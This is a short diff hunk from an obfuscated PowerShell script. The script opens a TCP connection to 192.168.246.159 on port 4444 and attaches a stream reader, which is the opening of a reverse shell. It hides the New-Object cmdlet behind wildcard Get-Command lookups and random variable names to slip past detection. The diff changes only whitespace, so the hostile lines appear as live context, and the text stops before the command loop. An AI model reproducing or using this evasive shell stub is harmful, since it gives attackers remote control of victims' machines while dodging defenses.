@@ -1,6 +1,6 @@
 ﻿ $u4IBoL9H = 444+4000; 
  $JLBkPZ = '192.168.246.159'; 
-
+ 
  $N7ZSRxiq = & (Get-Command 'New-Obje?t' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] Net.Sockets.TCPClient($JLBkPZ, $u4IBoL9H); 
  $alT1 = $N7ZSRxiq.GetStream(); 
  $HuYk021y = & (Get-Command 'New-O?????' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] IO.StreamReader($alT1); 
